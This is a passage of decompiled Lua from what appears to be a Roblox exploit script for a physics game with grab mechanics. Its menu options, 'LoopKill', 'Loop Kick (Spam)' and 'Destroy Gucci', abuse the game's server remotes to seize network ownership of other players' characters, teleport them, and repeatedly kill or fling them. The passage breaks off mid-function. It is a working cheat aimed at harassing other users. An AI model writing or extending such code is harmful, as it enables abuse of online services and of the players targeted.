                local humanoid = v46 and v46:FindFirstChildOfClass("Humanoid")

                if str2 == "GRAB" then
                    currentCamera.CameraType = Enum.CameraType.Scriptable
                    currentCamera.CFrame = cFrame
                    local humanoidRootPart = v46 and v46:WaitForChild("HumanoidRootPart")

                    if not humanoidRootPart then
                        currentCamera.CameraType = cameraType
                        currentCamera.CFrame = cFrame
                        return
                    end

                    local v47, v48, v49 = ipairs(tbl11)
                    local v50 = v49
                    local v51 = v47
                    local v52 = v48

                    while true do
                        local v53, v54 = v51(v52, v50)
                        if v53 == nil then
                            break
                        end
                        v50 = v53

                        if v54.Character and v54.Character.Parent == workspace then
                            local character = v54.Character
                            local torso = character:FindFirstChild("Torso")
                            local head_ = character:FindFirstChild("Head")
                            local humanoidRootPart2 = character:FindFirstChild("HumanoidRootPart")

                            if torso then
                                Struggle:FireServer()
                                local v55 = getCharacter()
                                local humanoidRootPart3 = v55 and v55:FindFirstChild("HumanoidRootPart")

                                if humanoidRootPart3 then
                                    local flag4 = false

                                    task.spawn(function()
                                        while true do
                                            task.wait(0.01)
                                            if torso:FindFirstChild("PartOwner") and torso:FindFirstChild("PartOwner").Value == p.Name then
                                                break
                                            end

                                            if flag4 then
                                                return
                                            end
                                        end

                                        flag4 = true
                                    end)

                                    local flag5 = (torso.Position - humanoidRootPart3.Position).Magnitude <= 24

                                    if flag5 then
                                        for i = 1, 12 do
                                            if flag4 then
                                                break
                                            end
                                            SetNetworkOwner:FireServer(torso, torso.CFrame)
                                            task.wait(0.02)
                                        end

                                        v50 = v53
                                    else
                                        local cFrame2 = humanoidRootPart3.CFrame
                                        task.wait(0.03)

                                        for i = 1, 18 do
                                            if flag4 then
                                                break
                                            end
                                            local assemblyLinearVelocity = torso.AssemblyLinearVelocity
                                            local position

                                            if assemblyLinearVelocity.Magnitude < 2 then
                                                position = torso.Position
                                            else
                                                local n2 = obj.Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000 * 0.8 + 0.05
                                                local vector = Vector3.new(0, -workspace.Gravity * 0.5, 0)
                                                position = torso.Position + assemblyLinearVelocity * n2 + vector * n2 * n2 * 0.5
                                            end

                                            humanoidRootPart3.CFrame = CFrame.new(position) * CFrame.new(0, 10, 0)
                                            task.wait(0.01)
                                            SetNetworkOwner:FireServer(torso, torso.CFrame)
                                        end

                                        v50 = v53
                                        task.wait(0.01)
                                        humanoidRootPart3.CFrame = cFrame2
                                    end

                                    flag4 = true

                                    task.spawn(function()
                                        repeat
                                            task.wait()
                                        until head_ and not head_:IsGrounded() and head_.AssemblyRootPart.ReceiveAge == 0 or not character.Parent

                                        local v56 = getCharacter()
                                        local humanoidRootPart4 = v56 and getCharacter():FindFirstChild("HumanoidRootPart")

                                        if humanoidRootPart4 and torso then
                                            torso.CFrame = humanoidRootPart4.CFrame + humanoidRootPart4.CFrame.LookVector * 5

                                            if humanoidRootPart2 then
                                                humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
                                            end
                                        end
                                    end)

                                    DestroyGrabLine:FireServer(torso)
                                end
                            end
                        end
                    end

                    currentCamera.CameraType = cameraType
                    currentCamera.CFrame = cFrame

                    if humanoid then
                        currentCamera.CameraSubject = humanoid
                    end
                elseif str2 == "BLOBMAN" then
                    local v47 = fn23()
                    if not v47 then
                        return
                    end
                    fn24(v47)
                    local v48 = getCharacter()
                    local humanoidRootPart = v48 and v48:FindFirstChild("HumanoidRootPart")
                    local humanoid2 = v48 and v48:FindFirstChildOfClass("Humanoid")
                    if not humanoidRootPart or not humanoid2 then
                        return
                    end
                    local flag4 = false

                    for i = 1, 30 do
                        if humanoid2.SeatPart and humanoid2.SeatPart:IsA("VehicleSeat") then
                            flag4 = true
                            break
                        end
                        task.wait(0.05)
                    end

                    if not flag4 then
                        return
                    end
                    local v49, v50, v51 = ipairs(tbl11)
                    local v52 = v51
                    local v53 = v49
                    local v54 = v50

                    while true do
                        local v55, v56 = v53(v54, v52)
                        if v55 == nil then
                            break
                        end
                        v52 = v55
                        local humanoidRootPart2 = v56.Character:FindFirstChild("HumanoidRootPart")

                        if humanoidRootPart2 then
                            local cFrame2 = humanoidRootPart.CFrame

                            pcall(function()
                                humanoidRootPart.CFrame = humanoidRootPart2.CFrame * CFrame.new(0, 0, -3)
                                humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
                            end)

                            task.wait(0.15)
                            local n2 = 0
                            local n3, v57, humanoid3, parent, tbl12, flag5, leftDetector, leftWeld

                            repeat
                                n3 = n2 + 1
                                if n3 > 15 then
                                    break
                                end
                                n2 = n3
                                v57 = nil

                                if typeof(v56) == "Instance" and v56:IsA("Player") then
                                    v57 = v56
                                end

                                humanoid3 = v48:FindFirstChildOfClass("Humanoid")

                                if humanoid3 and humanoid3.SeatPart and v57 then
                                    parent = humanoid3.SeatPart.Parent

                                    if parent and parent:FindFirstChild("LeftDetector") then
                                        tbl12 = {
                                            parent.LeftDetector,
                                            v56.Character.HumanoidRootPart,
                                            parent.LeftDetector:FindFirstChild("LeftWeld"),
                                        }

                                        parent.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(tbl12))
                                    end
                                end

                                task.wait(0.02)
                                flag5 = false

                                if humanoid3 and humanoid3.Sit and humanoid3.SeatPart and tostring(humanoid3.SeatPart.Parent) == "CreatureBlobman" then
                                    _G.blobseat = humanoid3.SeatPart.Parent
                                    leftDetector = humanoid3.SeatPart.Parent:FindFirstChild("LeftDetector")
                                    leftWeld = leftDetector and humanoid3.SeatPart.Parent.LeftDetector:FindFirstChild("LeftWeld")

                                    if leftWeld and leftWeld.Attachment0 and leftWeld.Attachment0.Parent and obj.Players:GetPlayerFromCharacter(leftWeld.Attachment0.Parent.Parent) == v56 then
                                        flag5 = true
                                    end
                                end
                            until flag5

                            v52 = v55
                            task.wait(0.04)

                            pcall(function()
                                humanoidRootPart.CFrame = cFrame2
                                humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
                            end)

                            task.wait(0.2)
                        end
                    end

                    if humanoid2 then
                        currentCamera.CameraSubject = humanoid2
                    end
                end
            end,
        })

        Blobman:AddToggle("blobkillLoop", {
            Text = "LoopKill",
            Default = false,
            Callback = function(loopkillblob)
                tbl2.Loopkillblob = loopkillblob

                if loopkillblob then
                    if not tbl2.PlayerList or #tbl2.PlayerList == 0 then
                        task.spawn(function()
                            toggles.blobkillLoop:SetValue(false)
                        end)

                        return
                    end

                    local character = localPlayer.Character
                    local humanoid = character:FindFirstChild("Humanoid")
                    local humanoid2 = humanoid or character:WaitForChild("Humanoid")
                    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                    local humanoidRootPart2 = humanoidRootPart or character:WaitForChild("HumanoidRootPart")
                    local pivot = character:GetPivot()

                    if tbl2.I9J0 == nil or tbl2.I9J0:FindFirstChild("VehicleSeat") == nil or tbl2.I9J0.VehicleSeat.Occupant ~= humanoid2 then
                        local seatPart = humanoid2.SeatPart
                        local creatureBlobman = seatPart and humanoid2.SeatPart:FindFirstAncestor("CreatureBlobman")
                        tbl2.I9J0 = creatureBlobman
                    end

                    local i9J0 = tbl2.I9J0
                    local v46 = i9J0

                    if not i9J0 then
                        if InPlot.Value and not InOwnedPlot.Value then
                            InPlot:GetPropertyChangedSignal("Value"):Wait()
                        end

                        if not CanSpawnToy.Value then
                            CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
                        end

                        local a1B2 = tbl2.A1B2
                        local v47 = a1B2 or humanoidRootPart2
                        local n2 = v47.CFrame * CFrame.new(0, 14, 20)
                        local lastHouse

                        if InOwnedPlot.Value then
                            if tbl2.LastHouse == nil or tbl2.LastPlotOwner == nil or tbl2.LastPlotOwner.Parent == nil then
                                local n3 = 0
                                local n4

                                repeat
                                    n4 = n3 + 1
                                    if n4 > 5 then
                                        break
                                    end

                                    for k, child in pairs(workspace.Plots["Plot" .. n4].PlotSign.ThisPlotsOwners:GetChildren()) do
                                        if child.Value == localPlayer.Name then
                                            tbl2.LastHouse = workspace.PlotItems["Plot" .. n4]
                                            tbl2.LastPlotOwner = child
                                            break
                                        end
                                    end

                                    n3 = n4
                                until tbl2.LastHouse
                            end

                            lastHouse = tbl2.LastHouse
                        else
                            lastHouse = SpawnedInToys
                        end

                        if lastHouse then
                            local v48 = nil

                            local connection2 = lastHouse.ChildAdded:Connect(function(child)
                                if child.Name == "CreatureBlobman" then
                                    v48 = child
                                end
                            end)

                            task.spawn(function()
                                pcall(function()
                                    fn4("CreatureBlobman", n2, Vector3.zero)
                                end)
                            end)

                            local now2 = tick()

                            repeat
                                task.wait()
                            until v48 or tick() - now2 > 2.5

                            connection2:Disconnect()
                            v46 = v48
                        end
                    end

                    if not v46 then
                        return
                    end
                    local vehicleSeat = v46:FindFirstChild("VehicleSeat")
                    local vehicleSeat2 = vehicleSeat or v46:WaitForChild("VehicleSeat")
                    vehicleSeat2:Sit(humanoid2)
                    local blobmanSeatAndOwnerScript = v46:FindFirstChild("BlobmanSeatAndOwnerScript")
                    local blobmanSeatAndOwnerScript2 = blobmanSeatAndOwnerScript or v46:WaitForChild("BlobmanSeatAndOwnerScript")
                    local creatureGrab = blobmanSeatAndOwnerScript2:FindFirstChild("CreatureGrab")
                    local creatureGrab2 = creatureGrab or blobmanSeatAndOwnerScript2:WaitForChild("CreatureGrab")
                    local creatureRelease = blobmanSeatAndOwnerScript2:FindFirstChild("CreatureRelease")
                    local creatureRelease2 = creatureRelease or blobmanSeatAndOwnerScript2:WaitForChild("CreatureRelease")
                    local rightDetector = v46:FindFirstChild("RightDetector")
                    local rightDetector2 = rightDetector or v46:WaitForChild("RightDetector")
                    local rightWeld = rightDetector2

                    if rightDetector2 then
                        local rightWeld2 = rightDetector2:FindFirstChild("RightWeld")
                        rightWeld = rightWeld2 or rightDetector2:WaitForChild("RightWeld")
                    end

                    while not humanoid2.SeatPart do
                        task.wait()
                    end

                    task.spawn(function()
                        local v47, v48, v49, v50, v51, v52, v53, v54, v55, character2, humanoidRootPart3, flag, character3, humanoidRootPart4, flag2, v56, v57, n2, n3, n4
                        n4 = 1

                        while true do
                            if n4 == 1 then
                                if tbl2.Loopkillblob and task.wait() then
                                    n4 = 3
                                else
                                    n4 = 2
                                end
                            elseif n4 == 2 then
                                return
                            elseif n4 == 3 then
                                if tbl2.PlayerList and #tbl2.PlayerList ~= 0 then
                                    n4 = 5
                                else
                                    n4 = 4
                                end
                            elseif n4 == 4 then
                                task.wait(0.5)
                                n4 = 1
                            elseif n4 == 5 then
                                v47, v48, v49 = ipairs(tbl2.PlayerList)
                                v50 = v49
                                v51 = v47
                                v52 = v48
                                n4 = 6
                            elseif n4 == 6 then
                                v53, v54 = v51(v52, v50)

                                if v53 == nil then
                                    n4 = 1
                                else
                                    n4 = 7
                                end
                            elseif n4 == 7 then
                                v50 = v53

                                if tbl2.Loopkillblob then
                                    n4 = 8
                                else
                                    n4 = 1
                                end
                            elseif n4 == 8 then
                                v55 = obj.Players:FindFirstChild(v54)

                                if v55 and v55.Character then
                                    n4 = 9
                                else
                                    n4 = 6
                                end
                            elseif n4 == 9 then
                                tbl2.C3D4 = v55
                                character2 = v55.Character
                                humanoidRootPart3 = character2

                                if character2 then
                                    n4 = 10
                                else
                                    n4 = 11
                                end
                            elseif n4 == 10 then
                                humanoidRootPart3 = v55.Character:FindFirstChild("HumanoidRootPart")
                                n4 = 11
                            elseif n4 == 11 then
                                tbl2.E5F6 = humanoidRootPart3
                                tbl2.G7H8 = v55.Character:FindFirstChild("Humanoid")
                                flag = true

                                if v55 and v55.Character and v55.Character:FindFirstChild("HumanoidRootPart") then
                                    n4 = 12
                                else
                                    n4 = 15
                                end
                            elseif n4 == 12 then
                                if tbl2.HeightLimit < v55.Character.HumanoidRootPart.Position.Y then
                                    n4 = 14
                                else
                                    n4 = 13
                                end
                            elseif n4 == 13 then
                                flag = false
                                n4 = 15
                            elseif n4 == 14 then
                                flag = true
                                n4 = 15
                            elseif n4 == 15 then
                                if tbl2.E5F6 and tbl2.G7H8 and not flag and tbl2.G7H8.Health ~= 0 then
                                    n4 = 16
                                else
                                    n4 = 6
                                end
                            elseif n4 == 16 then
                                pivot = character:GetPivot()
                                n4 = 17
                            elseif n4 == 17 then
                                if not rightWeld.Attachment0 and tbl2.Loopkillblob then
                                    n4 = 18
                                else
                                    n4 = 26
                                end
                            elseif n4 == 18 then
                                task.wait(0.05)
                                character3 = v55.Character
                                humanoidRootPart4 = character3

                                if character3 then
                                    n4 = 19
                                else
                                    n4 = 20
                                end
                            elseif n4 == 19 then
                                humanoidRootPart4 = v55.Character:FindFirstChild("HumanoidRootPart")
                                n4 = 20
                            elseif n4 == 20 then
                                tbl2.E5F6 = humanoidRootPart4
                                tbl2.G7H8 = v55.Character:FindFirstChild("Humanoid")
                                flag2 = true

                                if v55 and v55.Character and v55.Character:FindFirstChild("HumanoidRootPart") then
                                    n4 = 21
                                else
                                    n4 = 24
                                end
                            elseif n4 == 21 then
                                if tbl2.HeightLimit < v55.Character.HumanoidRootPart.Position.Y then
                                    n4 = 23
                                else
                                    n4 = 22
                                end
                            elseif n4 == 22 then
                                flag2 = false
                                n4 = 24
                            elseif n4 == 23 then
                                flag2 = true
                                n4 = 24
                            elseif n4 == 24 then
                                if tbl2.E5F6 and tbl2.G7H8 and not flag2 and tbl2.G7H8.Health ~= 0 then
                                    n4 = 33
                                else
                                    n4 = 25
                                end
                            elseif n4 == 25 then
                                character:PivotTo(pivot)
                                n4 = 26
                            elseif n4 == 26 then
                                if tbl2.Loopkillblob then
                                    n4 = 27
                                else
                                    n4 = 1
                                end
                            elseif n4 == 27 then
                                creatureRelease2:FireServer(rightWeld, tbl2.E5F6)
                                character:PivotTo(tbl2.E5F6.CFrame)
                                v56 = v51
                                v57 = v52
                                n2 = 0
                                n4 = 28
                            elseif n4 == 28 then
                                n3 = n2 + 1

                                if n3 <= 10 then
                                    n4 = 30
                                else
                                    n4 = 29
                                end
                            elseif n4 == 29 then
                                v50 = v53
                                v51 = v56
                                v52 = v57
                                character:PivotTo(pivot)
                                humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
                                humanoidRootPart2.AssemblyAngularVelocity = Vector3.zero
                                n4 = 6
                            elseif n4 == 30 then
                                n2 = n3
                                humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
                                humanoidRootPart2.AssemblyAngularVelocity = Vector3.zero
                                creatureGrab2:FireServer(rightDetector2, tbl2.E5F6, rightWeld)
                                creatureRelease2:FireServer(rightWeld, tbl2.E5F6)

                                if tbl2.E5F6 and tbl2.E5F6:IsDescendantOf(workspace) and tbl2.E5F6.ReceiveAge == 0 then
                                    n4 = 31
                                else
                                    n4 = 32
                                end
                            elseif n4 == 31 then
                                tbl2.G7H8.BreakJointsOnDeath = false
                                tbl2.G7H8:ChangeState(Enum.HumanoidStateType.Dead)
                                tbl2.G7H8.Sit = false
                                tbl2.G7H8.Jump = true
                                n4 = 32
                            elseif n4 == 32 then
                                task.wait()
                                n4 = 28
                            elseif n4 == 33 then
                                if humanoid2.SeatPart then
                                    n4 = 35
                                else
                                    n4 = 34
                                end
                            elseif n4 == 34 then
                                SpawnedInToys:FindFirstChild("CreatureBlobman").VehicleSeat:Sit(humanoid2)
                                n4 = 35
                            elseif n4 == 35 then
                                character:PivotTo(tbl2.E5F6.CFrame)
                                humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
                                humanoidRootPart2.AssemblyAngularVelocity = Vector3.zero
                                creatureGrab2:FireServer(rightDetector2, tbl2.E5F6, rightWeld)
                                n4 = 17
                            end
                        end
                    end)
                end
            end,
        })

        Blobman:AddToggle("spamkickbl", {
            Text = "Loop Kick (Spam)",
            Default = false,
            Settings = false,
            Callback = function(spamkickblT)
                tbl2.SpamkickblT = spamkickblT
                local playerList = tbl2.PlayerList
                local v46 = playerList and tbl2.PlayerList[1]
                local v47 = v46 and obj.Players:FindFirstChild(v46)
                if spamkickblT and not v47 then
                    tbl2.SpamkickblT = false
                    return
                end
                local character = localPlayer.Character
                local humanoid = character and character:FindFirstChild("Humanoid")
                local seatPart = humanoid and humanoid.SeatPart
                if spamkickblT and (not seatPart or seatPart.Parent.Name ~= "CreatureBlobman") then
                    tbl2.SpamkickblT = false
                    return
                end

                if not spamkickblT then
                    tbl2.SpamkickblT = false
                    return
                end

                task.spawn(function()
                    local parent, humanoidRootPart, primaryPart, blobmanSeatAndOwnerScript, creatureGrab, creatureDrop, rightDetector, weld, rightWeld, cFrame, flag, cFrame2, fn40, playerList2, v48, v49, character2, humanoidRootPart2, humanoid2, playerList3
                    local v50, v51, character3, humanoidRootPart3, humanoid3, rightWeld2, weld2, n2
                    n2 = 1

                    while true do
                        if n2 == 1 then
                            parent = seatPart.Parent
                            humanoidRootPart = parent:FindFirstChild("HumanoidRootPart")
                            primaryPart = humanoidRootPart

                            if humanoidRootPart then
                                n2 = 3
                            else
                                n2 = 2
                            end
                        elseif n2 == 2 then
                            primaryPart = parent.PrimaryPart
                            n2 = 3
                        elseif n2 == 3 then
                            blobmanSeatAndOwnerScript = parent:FindFirstChild("BlobmanSeatAndOwnerScript")
                            creatureGrab = blobmanSeatAndOwnerScript

                            if blobmanSeatAndOwnerScript then
                                n2 = 4
                            else
                                n2 = 5
                            end
                        elseif n2 == 4 then
                            creatureGrab = blobmanSeatAndOwnerScript:FindFirstChild("CreatureGrab")
                            n2 = 5
                        elseif n2 == 5 then
                            creatureDrop = blobmanSeatAndOwnerScript

                            if blobmanSeatAndOwnerScript then
                                n2 = 6
                            else
                                n2 = 7
                            end
                        elseif n2 == 6 then
                            creatureDrop = blobmanSeatAndOwnerScript:FindFirstChild("CreatureDrop")
                            n2 = 7
                        elseif n2 == 7 then
                            rightDetector = parent:FindFirstChild("RightDetector")
                            weld = rightDetector

                            if rightDetector then
                                n2 = 8
                            else
                                n2 = 10
                            end
                        elseif n2 == 8 then
                            rightWeld = rightDetector:FindFirstChild("RightWeld")
                            weld = rightWeld

                            if rightWeld then
                                n2 = 10
                            else
                                n2 = 9
                            end
                        elseif n2 == 9 then
                            weld = rightDetector:FindFirstChildWhichIsA("Weld")
                            n2 = 10
                        elseif n2 == 10 then
                            cFrame = primaryPart.CFrame
                            flag = false
                            cFrame2 = cFrame * CFrame.new(0, 19, 0)

                            fn40 = function()
                                local playerList4 = tbl2.PlayerList
                                local v52 = playerList4 and tbl2.PlayerList[1]
                                local v53 = v52 and obj.Players:FindFirstChild(v52)

                                if v53 and v53.Character then
                                    local humanoidRootPart4 = v53.Character:FindFirstChild("HumanoidRootPart")

                                    if humanoidRootPart4 and primaryPart then
                                        primaryPart.CFrame = humanoidRootPart4.CFrame
                                        primaryPart.Velocity = Vector3.zero

                                        if creatureGrab and rightDetector then
                                            creatureGrab:FireServer(rightDetector, humanoidRootPart4, weld)
                                        end

                                        if CreateGrabLine then
                                            CreateGrabLine:FireServer(humanoidRootPart4, Vector3.zero, humanoidRootPart4.Position, false)
                                        end

                                        local now2 = tick()

                                        while tick() - now2 < 0.7 do
                                            if SetNetworkOwner and humanoidRootPart4.Parent then
                                                SetNetworkOwner:FireServer(humanoidRootPart4, humanoidRootPart4.CFrame)
                                            end

                                            obj.RunService.Heartbeat:Wait()
                                        end

                                        primaryPart.CFrame = cFrame
                                        primaryPart.Velocity = Vector3.zero
                                        local now3 = tick()

                                        while tick() - now3 < 0.7 do
                                            if SetNetworkOwner and humanoidRootPart4.Parent then
                                                SetNetworkOwner:FireServer(humanoidRootPart4, humanoidRootPart4.CFrame)
                                            end

                                            obj.RunService.Heartbeat:Wait()
                                        end
                                    end
                                end
                            end

                            fn40()
                            n2 = 11
                        elseif n2 == 11 then
                            if tbl2.SpamkickblT then
                                n2 = 12
                            else
                                n2 = 69
                            end
                        elseif n2 == 12 then
                            playerList2 = tbl2.PlayerList
                            v48 = playerList2

                            if playerList2 then
                                n2 = 13
                            else
                                n2 = 14
                            end
                        elseif n2 == 13 then
                            v48 = tbl2.PlayerList[1]
                            n2 = 14
                        elseif n2 == 14 then
                            v49 = v48

                            if v48 then
                                n2 = 15
                            else
                                n2 = 16
                            end
                        elseif n2 == 15 then
                            v49 = obj.Players:FindFirstChild(v48)
                            n2 = 16
                        elseif n2 == 16 then
                            if v49 and v49.Parent and v49.Character then
                                n2 = 18
                            else
                                n2 = 17
                            end
                        elseif n2 == 17 then
                            tbl2.SpamkickblT = false
                            n2 = 69
                        elseif n2 == 18 then
                            character2 = v49.Character
                            humanoidRootPart2 = character2

                            if character2 then
                                n2 = 19
                            else
                                n2 = 20
                            end
                        elseif n2 == 19 then
                            humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")
                            n2 = 20
                        elseif n2 == 20 then
                            humanoid2 = character2

                            if character2 then
                                n2 = 21
                            else
                                n2 = 22
                            end
                        elseif n2 == 21 then
                            humanoid2 = character2:FindFirstChild("Humanoid")
                            n2 = 22
                        elseif n2 == 22 then
                            if humanoid2 and humanoidRootPart2 then
                                n2 = 24
                            else
                                n2 = 23
                            end
                        elseif n2 == 23 then
                            obj.RunService.Heartbeat:Wait()
                            n2 = 11
                        elseif n2 == 24 then
                            if humanoid2.Health > 0 and flag then
                                n2 = 68
                            else
                                n2 = 25
                            end
                        elseif n2 == 25 then
                            if humanoid2.Health <= 0 then
                                n2 = 67
                            else
                                n2 = 26
                            end
                        elseif n2 == 26 then
                            primaryPart.CFrame = cFrame
                            primaryPart.Velocity = Vector3.zero
                            humanoidRootPart2.CFrame = cFrame2
                            humanoidRootPart2.Velocity = Vector3.zero
                            humanoidRootPart2.RotVelocity = Vector3.zero

                            if humanoidRootPart2.AssemblyLinearVelocity then
                                n2 = 27
                            else
                                n2 = 28
                            end
                        elseif n2 == 27 then
                            humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
                            humanoidRootPart2.AssemblyAngularVelocity = Vector3.zero
                            n2 = 28
                        elseif n2 == 28 then
                            if SetNetworkOwner then
                                n2 = 29
                            else
                                n2 = 30
                            end
                        elseif n2 == 29 then
                            SetNetworkOwner:FireServer(humanoidRootPart2, cFrame2)
                            n2 = 30
                        elseif n2 == 30 then
                            obj.RunService.Heartbeat:Wait()
                            n2 = 31
                        elseif n2 == 31 then
                            if tbl2.SpamkickblT then
                                n2 = 32
                            else
                                n2 = 64
                            end
                        elseif n2 == 32 then
                            playerList3 = tbl2.PlayerList
                            v50 = playerList3

                            if playerList3 then
                                n2 = 33
                            else
                                n2 = 34
                            end
                        elseif n2 == 33 then
                            v50 = tbl2.PlayerList[1]
                            n2 = 34
                        elseif n2 == 34 then
                            v51 = v50

                            if v50 then
                                n2 = 35
                            else
                                n2 = 36
                            end
                        elseif n2 == 35 then
                            v51 = obj.Players:FindFirstChild(v50)
                            n2 = 36
                        elseif n2 == 36 then
                            if v51 and v51.Parent and v51.Character then
                                n2 = 38
                            else
                                n2 = 37
                            end
                        elseif n2 == 37 then
                            tbl2.SpamkickblT = false
                            n2 = 64
                        elseif n2 == 38 then
                            character3 = v51.Character
                            humanoidRootPart3 = character3

                            if character3 then
                                n2 = 39
                            else
                                n2 = 40
                            end
                        elseif n2 == 39 then
                            humanoidRootPart3 = character3:FindFirstChild("HumanoidRootPart")
                            n2 = 40
                        elseif n2 == 40 then
                            humanoid3 = character3

                            if character3 then
                                n2 = 41
                            else
                                n2 = 42
                            end
                        elseif n2 == 41 then
                            humanoid3 = character3:FindFirstChild("Humanoid")
                            n2 = 42
                        elseif n2 == 42 then
                            if humanoid3 and humanoidRootPart3 then
                                n2 = 44
                            else
                                n2 = 43
                            end
                        elseif n2 == 43 then
                            obj.RunService.Heartbeat:Wait()
                            n2 = 31
                        elseif n2 == 44 then
                            if humanoid3.Health > 0 and flag then
                                n2 = 63
                            else
                                n2 = 45
                            end
                        elseif n2 == 45 then
                            if humanoid3.Health <= 0 then
                                n2 = 62
                            else
                                n2 = 46
                            end
                        elseif n2 == 46 then
                            primaryPart.CFrame = cFrame
                            primaryPart.Velocity = Vector3.zero
                            humanoidRootPart3.CFrame = cFrame2
                            humanoidRootPart3.Velocity = Vector3.zero
                            humanoidRootPart3.RotVelocity = Vector3.zero

                            if humanoidRootPart3.AssemblyLinearVelocity then
                                n2 = 47
                            else
                                n2 = 48
                            end
                        elseif n2 == 47 then
                            humanoidRootPart3.AssemblyLinearVelocity = Vector3.zero
                            humanoidRootPart3.AssemblyAngularVelocity = Vector3.zero
                            n2 = 48
                        elseif n2 == 48 then
                            if SetNetworkOwner then
                                n2 = 49
                            else
                                n2 = 50
                            end
                        elseif n2 == 49 then
                            SetNetworkOwner:FireServer(humanoidRootPart3, cFrame2)
                            n2 = 50
                        elseif n2 == 50 then
                            humanoid3.PlatformStand = true
                            humanoid3.Sit = true

                            if rightDetector then
                                n2 = 51
                            else
                                n2 = 55
                            end
                        elseif n2 == 51 then
                            rightWeld2 = rightDetector:FindFirstChild("RightWeld")
                            weld2 = rightWeld2

                            if rightWeld2 then
                                n2 = 53
                            else
                                n2 = 52
                            end
                        elseif n2 == 52 then
                            weld2 = rightDetector:FindFirstChildWhichIsA("Weld")
                            n2 = 53
                        elseif n2 == 53 then
                            if weld2 and creatureDrop then
                                n2 = 54
                            else
                                n2 = 55
                            end
                        elseif n2 == 54 then
                            creatureDrop:FireServer(weld2)
                            n2 = 55
                        elseif n2 == 55 then
                            if DestroyGrabLine then
                                n2 = 56
                            else
                                n2 = 57
                            end
                        elseif n2 == 56 then
                            DestroyGrabLine:FireServer(humanoidRootPart3)
                            n2 = 57
                        elseif n2 == 57 then
                            if rightDetector and creatureGrab then
                                n2 = 58
                            else
                                n2 = 59
                            end
                        elseif n2 == 58 then
                            creatureGrab:FireServer(rightDetector, humanoidRootPart3, weld)
                            n2 = 59
                        elseif n2 == 59 then
                            if CreateGrabLine then
                                n2 = 60
                            else
                                n2 = 61
                            end
                        elseif n2 == 60 then
                            CreateGrabLine:FireServer(humanoidRootPart3, Vector3.zero, humanoidRootPart3.Position, false)
                            n2 = 61
                        elseif n2 == 61 then
                            obj.RunService.Heartbeat:Wait()
                            n2 = 11
                        elseif n2 == 62 then
                            flag = true
                            obj.RunService.Heartbeat:Wait()
                            n2 = 31
                        elseif n2 == 63 then
                            flag = false
                            fn40()
                            obj.RunService.Heartbeat:Wait()
                            n2 = 31
                        elseif n2 == 64 then
                            tbl2.SpamkickblT = false

                            if primaryPart then
                                n2 = 65
                            else
                                n2 = 66
                            end
                        elseif n2 == 65 then
                            primaryPart.CFrame = cFrame
                            primaryPart.Velocity = Vector3.zero
                            n2 = 66
                        elseif n2 == 66 then
                            return
                        elseif n2 == 67 then
                            flag = true
                            obj.RunService.Heartbeat:Wait()
                            n2 = 11
                        elseif n2 == 68 then
                            flag = false
                            fn40()
                            obj.RunService.Heartbeat:Wait()
                            n2 = 11
                        elseif n2 == 69 then
                            tbl2.SpamkickblT = false

                            if primaryPart then
                                n2 = 70
                            else
                                n2 = 71
                            end
                        elseif n2 == 70 then
                            primaryPart.CFrame = cFrame
                            primaryPart.Velocity = Vector3.zero
                            n2 = 71
                        elseif n2 == 71 then
                            return
                        end
                    end
                end)
            end,
        })

        v18:AddButton({
            Text = "Destroy Gucci [BLOB]",
            Func = function()
                local v46, v47 = getLocalCharAndHum()
                if not v46 or not v47 then
                    return
                end
                local playerList = tbl2.PlayerList
                local tbl11 = playerList or {}

                if type(tbl11) == "string" then
                    tbl11 = {tbl11}
                end

                local v48, v49, v50 = ipairs(tbl11)
                local v51 = v50
                local v52 = v48
                local v53 = v49

                while true do
                    local v54, v55 = v52(v53, v51)
                    if v54 == nil then
                        break
                    end
                    v51 = v54
                    local v56 = obj.Players:FindFirstChild(v55)
                    local character = v56 and v56.Character
                    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
                    local humanoid = character and character:FindFirstChild("Humanoid")

                    if humanoidRootPart and humanoid then
                        local gucciBlob = tbl2.GucciBlob
                        local v57 = gucciBlob
                        local vehicleSeat = gucciBlob and gucciBlob:FindFirstChild("VehicleSeat")

                        if not gucciBlob or not vehicleSeat or vehicleSeat.Occupant ~= v47 then
                            local seatPart = v47.SeatPart
                            local creatureBlobman = seatPart and v47.SeatPart:FindFirstAncestor("CreatureBlobman")
                            v57 = creatureBlobman
                        end

                        if not v57 then
                            local v58 = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                            local humanoidRootPart2 = v46:FindFirstChild("HumanoidRootPart")
                            if not humanoidRootPart2 then
                                return
                            end

                            if InPlot.Value and not InOwnedPlot.Value then
                                InPlot:GetPropertyChangedSignal("Value"):Wait()
                            end

                            if not CanSpawnToy.Value then
                                CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
                            end

                            local lastHouse

                            if InOwnedPlot.Value then
                                if tbl2.LastHouse == nil or tbl2.LastPlotOwner == nil or tbl2.LastPlotOwner.Parent == nil then
                                    local n2 = 0
                                    local v59 = v54
                                    local v60 = v52
                                    local v61 = v53
                                    local n3, v62, plotSign, thisPlotsOwners

                                    repeat
                                        n3 = n2 + 1
                                        if n3 > 5 then
                                            break
                                        end
                                        n2 = n3
                                        v62 = workspace.Plots:FindFirstChild("Plot" .. n3)
                                        plotSign = v62 and v62:FindFirstChild("PlotSign")
                                        thisPlotsOwners = plotSign and plotSign:FindFirstChild("ThisPlotsOwners")

                                        if thisPlotsOwners then
                                            for k, child in pairs(thisPlotsOwners:GetChildren()) do
                                                if child.Value == localPlayer.Name then
                                                    tbl2.LastHouse = workspace.PlotItems:FindFirstChild("Plot" .. n3)
                                                    tbl2.LastPlotOwner = child
                                                    break
                                                end
                                            end

                                            n2 = n3
                                        end
                                    until tbl2.LastHouse

                                    v51 = v59
                                    v52 = v60
                                    v53 = v61
                                end

                                lastHouse = tbl2.LastHouse
                            else
                                lastHouse = v58
                            end

                            if not lastHouse then
